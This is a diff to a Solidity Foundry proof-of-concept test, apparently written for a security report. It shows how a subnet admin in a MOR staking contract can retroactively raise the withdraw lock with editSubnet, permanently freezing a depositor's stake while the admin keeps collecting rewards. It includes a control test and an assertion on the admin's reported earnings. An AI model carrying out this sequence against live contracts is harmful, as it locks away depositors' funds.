@@ -114,6 +114,8 @@ contract PocA002 {
 
         uint256 claimed = MOR.balanceOf(ATTACKER);
         require(claimed > 0, "admin did not earn on the trapped principal");
+        // Grounds the report's figure: 29.39 MOR per 30 days (asserted band, deterministic fork).
+        require(claimed >= 25e18 && claimed <= 35e18, "claimed outside the reported band");
 
         // The victim is still locked out while the admin is being paid.
         vm.startPrank(VICTIM);
@@ -121,6 +123,59 @@ contract PocA002 {
         vm.stopPrank();
 
         require(MOR.balanceOf(VICTIM) == 0, "victim recovered MOR");
+    }
+
+
+    /// Control: the identical position IS withdrawable the moment the advertised lock expires;
+    /// only the subsequent editSubnet turns the same stake into a permanent freeze.
+    function test_controlWithdrawSucceedsBeforeEdit() public {
+        uint256 minLock = BUILDERS.minimalWithdrawLockPeriod();
+        _fund(VICTIM, STAKE);
+
+        IBuildersV4.Subnet memory sn = IBuildersV4.Subnet({
+            name: "poc-control",
+            admin: ATTACKER,
+            unusedStorage1_V4Update: 0,
+            withdrawLockPeriodAfterDeposit: uint128(minLock),
+            unusedStorage2_V4Update: 0,
+            minimalDeposit: 1e18,
+            claimAdmin: ATTACKER
+        });
+        vm.startPrank(ATTACKER);
+        BUILDERS.createSubnet(sn, IBuildersV4.SubnetMetadata("poc", "poc", "poc", "poc"));
+        bytes32 subnetId = BUILDERS.getSubnetId("poc-control");
+        vm.stopPrank();
+
+        vm.startPrank(VICTIM);
+        MOR.approve(address(BUILDERS), STAKE);
+        BUILDERS.deposit(subnetId, STAKE);
+        vm.stopPrank();
+        vm.warp(block.timestamp + minLock + 1);
+
+        // Before any edit: the full withdrawal succeeds.
+        vm.prank(VICTIM);
+        BUILDERS.withdraw(subnetId, STAKE);
+        require(MOR.balanceOf(VICTIM) == STAKE, "control: withdrawal should have succeeded");
+
+        // Same position again, one difference only: the admin now raises the lock retroactively.
+        vm.startPrank(VICTIM);
+        MOR.approve(address(BUILDERS), STAKE);
+        BUILDERS.deposit(subnetId, STAKE);
+        vm.stopPrank();
+        vm.warp(block.timestamp + minLock + 1);
+
+        sn.withdrawLockPeriodAfterDeposit = uint128(FOREVER);
+        vm.prank(ATTACKER);
+        BUILDERS.editSubnet(subnetId, sn);
+
+        vm.startPrank(VICTIM);
+        try BUILDERS.withdraw(subnetId, STAKE) {
+            require(false, "withdraw unexpectedly succeeded after the edit - finding refuted");
+        } catch (bytes memory reason) {
+            _requireLockRevert(reason);
+        }
+        vm.stopPrank();
+        require(MOR.balanceOf(VICTIM) == 0, "victim must not recover after the edit");
     }
 
     /// Creates a subnet the way any unprivileged address can, lets the victim stake under the
